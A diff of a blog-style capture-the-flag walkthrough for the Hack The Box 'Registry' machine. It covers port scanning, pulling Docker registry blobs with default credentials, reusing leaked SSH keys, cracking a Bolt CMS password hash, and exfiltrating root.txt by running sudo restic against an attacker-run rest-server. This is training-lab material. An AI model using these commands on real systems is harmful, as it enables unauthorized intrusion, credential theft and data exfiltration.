@@ -41,12 +41,14 @@ My go-to tools in this phase, which are typically used by many to start enumerat
 
 Here, I am designating the interface to use when communitcating to the HTB machine (-e) which will be the HTB VPN interface, along with -p to designate the port range to target but I will target ALL TCP and UDP Ports, and the transmission rate of packets per second (--rate).
 
-Similar to this, you could also run something like this: 
+Similar to this, you could also run something like this:
+
 ```nmap -p- --min-rate=1000 -T4 <hostname>```
 
 2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.
 
 What I typically start with when using nmap is:
+
 ```
 -sC: to use all default non-intrusive nmap scripts on each service 
 
@@ -58,6 +60,7 @@ What I typically start with when using nmap is:
 ```
 
 ### MASSCAN
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ sudo masscan -e tun1 -p1-65535,U:1-65535 10.10.10.159 --rate=1000 | tee Registry_masscan.log
 
@@ -71,6 +74,7 @@ Discovered open port 80/tcp on 10.10.10.159
 ```
 
 ### NMAP
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ nmap -sC -sV -vvv -p 22,80,443 registry.htb -oX Registry_TCP.xml -oN Registry_TCP.log
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 23:07 EST
@@ -172,7 +176,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds
 ```
 
-TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some good information in how to approach this one, as well as the CN being docker.registry.htb, which is also a clue. It might be related to Docker Registries.
+TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some good information in how to approach this one, as well as the CN being docker.registry.htb, which is also a clue. It might be related to Docker Registries. See below the certificate content pulled by nmap.
+
 ```
 443/tcp open  ssl/http syn-ack nginx 1.14.0 (Ubuntu)
 | http-methods: 
@@ -206,6 +211,7 @@ TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some goo
 | PEyspHOCbg1C6a0gI1xo0c0=
 |_-----END CERTIFICATE-----
 ```
+
 TCP80 doesn't give me much other that default webserver information:
 
 ![Registry_TCP80](/images/Registry_TCP80.png)
@@ -213,7 +219,6 @@ TCP80 doesn't give me much other that default webserver information:
 BUT TCP443, as mentioned above gave us the certificate information, and a blank page:
 
 ![Registry_TCP443](/images/Registry_TCP443.png)
-
 
 
 Let's try to enumerate the directories going straight to *HTTPS* (TCP443), but first let's add this into the hosts file as well.
@@ -257,6 +262,8 @@ Looks like we need to do some research on Docker APIs and there is also a good d
 
 After interacting with *Docker API* a little, we find the repositories, tags, and list of blobs which are important. For this, instead of using the browser, I used curl to see what was available but in a textual format and to possibly determine what I can do with it (*scripting?!*)
 
+
+### CURL
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/_catalog --basic --user admin:admin
 Note: Unnecessary use of -X or --request, GET is already inferred.
@@ -360,6 +367,7 @@ Note: Unnecessary use of -X or --request, GET is already inferred.
 ```
 
 As the Repository and Tags seems to be *bolt-image* and *latest*, let's try pulling a list of Blobs and see what's in there.
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/bolt-image/manifests/latest --basic --user admin:admin
 Note: Unnecessary use of -X or --request, GET is already inferred.
@@ -499,6 +507,7 @@ Note: Unnecessary use of -X or --request, GET is already inferred.
 ```
 
 ## Exploitation and Gaining Access
+
 The output is what we need, but we need to download each one as a tgz file and then uncompress to see if there is anything important. To do this I created a simple bash script that will download them as tgz, create logs files to make sure the download goes through as we need and uncompress in the process.
 
 The script can be found [HERE](https://github.com/grav3m1nd-byte/grav3m1nd-byte.github.io/blob/master/Scripts/dockerBlobsDump.sh)!
@@ -506,6 +515,7 @@ The script can be found [HERE](https://github.com/grav3m1nd-byte/grav3m1nd-byte.
 With this script, we can dump all the blobs we need so we can dig deeper into the files contained on each blob.
 
 ### Script Output:
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ./dockerBlobsDump.sh
 
@@ -573,11 +583,11 @@ sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
 
 While digging through the blob directories, we found the following:
 
-1) SSH key pairs in the 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/ directory.
+1) SSH key pairs in the *2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/* directory.
 
-2) Some scripts of interest (01-ssh.sh and 02-ssh.sh) under 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/etc/profile.d/
+2) Some scripts of interest (01-ssh.sh and 02-ssh.sh) under *2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/etc/profile.d/*
 
-Inspecting the second scripts gives us the passphrase for the id_rsa private key we found. Let's try these two:
+Inspecting the second scripts gives us the passphrase for the *id_rsa* private key we found. Let's try these two:
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ ssh -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb
@@ -601,6 +611,7 @@ user.txt
 bolt@bolt:~$ cat user.txt 
 ytc0y**********************3ywzi
 ```
+
 Listing files in the bolt's user home directory gives us the user flag file **(WOOT WOOT!)**
 
 
@@ -609,6 +620,7 @@ Listing files in the bolt's user home directory gives us the user flag file **(W
 Well, so far we tried finding any files/directories where the bolt group has access to but not much came up, but if we try what files are world-readable under /var we see some interesting things:
 
 Basically we can read to the index.php file in the install directory inside /var/www/html and also there seems to be another directory called bolt(?!) where we can read basically all the files inside.
+
 ```
 bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
 /var/www/html/install/index.php
@@ -631,7 +643,6 @@ bolt@bolt:~$ find /var -type f -perm -o=r 2> /dev/null
 
 These files look like quite something and by looking at the changelog.md, we find Bolt related to Bolt CMS and its database uses SQLITE and stored in bolt/app/database/bolt.db.
 
-The first lines gives us the version of Bolt so we can look at some exploits if needed, but we need to also move bolt.db locally to use SQLite Browser and find out what is in there
 ```
 bolt@bolt:/var/www/html/bolt$ cat changelog.md | grep Bolt
 Changelog for Bolt 3.x
@@ -643,10 +654,14 @@ total 288
 -rw-r--r-- 1 www-data www-data 294912 Oct 21 10:41 bolt.db
 ```
 
+The first lines gives us the version of Bolt so we can look at some exploits if needed, but we need to also move *bolt.db* locally to use SQLite Browser and find out what is in there.
+
 Retrieve bolt.db using SCP.
+
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ scp -i /home/kali/Documents/HTB-Labs/Registry/2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791/root/.ssh/id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db
 ```
+
 Once you retrieve it, open it locally SQLite Browser, try and see what items of interest like the users table could be found and if any create a new file containing the credentials found: sqlite_hash.lst.
 
 ![Registry_SQLite](/images/Registry_SQLite.png)
@@ -660,7 +675,9 @@ kali@back0ff:~/Documents/HTB-Labs/Registry$ cat sqlite_hash.lst
 admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
 ```
 
-At this point, we should try and crack these credentials using JohnTheRipper:
+At this point, we should try and crack these credentials using *JohnTheRipper*:
+
+### JOHNTHERIPPER
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ john --wordlist=/usr/share/wordlists/rockyou.txt sqlite_hash.lst > sqlite_creds.txt 
@@ -712,7 +729,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-The *index.php* page should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under /var/www/html/bolt, it is possible we are looking at this incorrectly. Looking at BOLT CMS documentation, the login should be under /bolt, but it isn't the case. Let's do a test:
+The *index.php* page should give us (possibly) a login page. This doesn't give us much, but as BOLT CMS is deployed under */var/www/html/bolt*, it is possible we are looking at this incorrectly.
+
+Looking at BOLT CMS documentation, the login should be under */bolt*, but it isn't the case.
+
+Let's do a test and use *https://registry.htb/bolt/bolt* as Bolt CMS was not deployed inside */var/www/html* as it normally would:
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://registry.htb/bolt/bolt
@@ -824,7 +845,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@bolt:~/html/bolt/theme$ 
 ```
 
-Let's run *sudo -l* to check on what we can run as *sudo*:
+Let's proceed run *sudo -l* to check on what we can run as *sudo*:
 
 ```
 www-data@bolt:~/html/bolt/theme$ sudo -l
@@ -841,9 +862,15 @@ www-data@bolt:~/html/bolt/theme$
 
 ## Data Exfiltration
 
-Something else we need to look at, restic for backups. While looking into this, we found out we must set a restic server locally and initialize the repository (see the resources section).
+Something else we need to look at, restic for backups. From the sudo permissions *www-data* user has, we see we can run anything through restic to ANY rest repository (a remote restic backup server):
 
-This whole process tells me one way we can approach this is by "exfiltrating data" from registry.htb. We can't do anything else here other than running the restic backup command on anything.
+Command available as sudo:
+
+```/usr/bin/restic backup -r rest*```
+
+While looking into this, we found out we must set a restic server locally in Kali and initialize the repository (see the resources section).
+
+This whole process tells me one way we can approach this is by "exfiltrating data" from registry.htb. We can't do anything else here other than running the restic backup command on anything, as explained above.
 
 Let's setup the restic server (*rest-server*) in a separate terminal window, locally:
 
@@ -915,7 +942,18 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 tcp6       0      0 ::1:61234               :::*                    LISTEN      -                   
 ```
 
-As TCP 61234 is now being used by registry.htb, rest-server is running on TCP 8000 on my localhost, let's try and run restic from registry.htb as www-data and try to exfiltrate the root.txt file using the port opened previously through SSH Remote Port Forwarding.
+Below is exactly what we were looking for:
+
+```
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:61234         0.0.0.0:*               LISTEN      -                   
+```
+
+
+As TCP 61234 is now being used by registry.htb and rest-server is running on TCP 8000 on my localhost, let's try and run restic from registry.htb.
+
+We need to run the restic command as weas www-data using *http://127.0.0.1:61234/* and try to exfiltrate the *root.txt* file using the port opened previously through SSH Remote Port Forwarding (used in the Restic Server URL).
 
 ```
 www-data@bolt:~/html/bolt/theme$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:61234/ /root/root.txt
@@ -935,6 +973,10 @@ www-data@bolt:~/html/bolt/theme$
 **AND we were successful at this, but not done yet!**
 
 After doing all this, we now need to restore the "backup" of the root.txt file locally so we can access the root flag.
+
+**SYNTAX:**
+```restic restore <snapshot_ID> -r rest:<Local_Rest_Server_URL> --target <path_to_restore>```
+
 
 ```
 kali@back0ff:~/Documents/HTB-Labs/Registry$ restic restore 3a378c88 -r rest:http://127.0.0.1:8000 --target .
